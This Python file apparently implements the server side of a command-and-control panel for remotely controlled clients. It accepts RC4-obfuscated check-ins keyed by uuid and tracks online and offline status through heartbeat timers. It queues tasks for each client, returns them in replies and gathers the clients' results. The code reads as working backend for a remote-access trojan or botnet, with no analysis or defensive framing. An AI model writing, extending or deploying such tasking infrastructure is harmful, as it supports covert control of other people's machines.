# coding:utf-8
import queue
import asyncio
from app.utils import *
from threading import Timer
from time import sleep
events = queue.Queue()
Conn = {}



def online_list():

    l = []
    for k in Conn:
        l.append({
            "uuid": k,
            "info": Conn[k]["info"]
        })
    return {
        "action": "just for you",
        "data": l
    }


def get_action():
    return events.get()


def do_action(uuid, do_something):
    if uuid not in Conn:
        return
    Conn[uuid]["do"].append(do_something)


def online(uuid):
    print("[!][BackEnd]Online:{}".format(uuid))

    events.put(
        {
            "action": "online",
            "data": {
                "uuid": uuid,
                "info": Conn[uuid]["info"]
            }
        }
    )


def offline(uuid):
    if uuid in Conn:

        events.put(
            {
                "action": "offline",
                "data": {
                    "uuid": uuid,
                    "info": Conn[uuid]["info"]["ip"]
                }
            }
        )
        Conn.pop(uuid)


def timer(uuid):
        offline(uuid)



def handle(packet):
    raw = rc4_decode(packet)
    data = loads(raw)
    first = False
    if "uuid" not in data or "info" not in data:
        return "", 404
    else:
        if data["uuid"] not in Conn:
            t = Timer(40, timer, (data["uuid"],))
            Conn[data["uuid"]] = {
                "info": data["info"],
                "timer": t,
                "next_second": 30,
                "do": []
            }
            t.start()
            first = True
            online(data["uuid"])

        if "next_second" in data and data["next_second"] != 0 and not first:

            # 更新表中的时间为下次检测日期
            Conn[data["uuid"]]["timer"].cancel()

            Conn[data["uuid"]]["next_second"] = data["next_second"]
            t = Timer(data["next_second"]+10, timer, (data["uuid"],))
            Conn[data["uuid"]]["timer"] = t
            t.start()


    if "result" in data and type(data["result"]) is list:
        if data["result"] is not []:
            for i in data["result"]:
                events.put(
                    {
                        "action": "result",
                        "data": {
                            "uuid": data["uuid"],
                            "action": i["action"],
                            "data": i["data"]
                        }
                    }
                )

    result = Conn[data["uuid"]]["do"]
    Conn[data["uuid"]]["do"] = []
    return rc4_encode(
        dumps(result)
    )
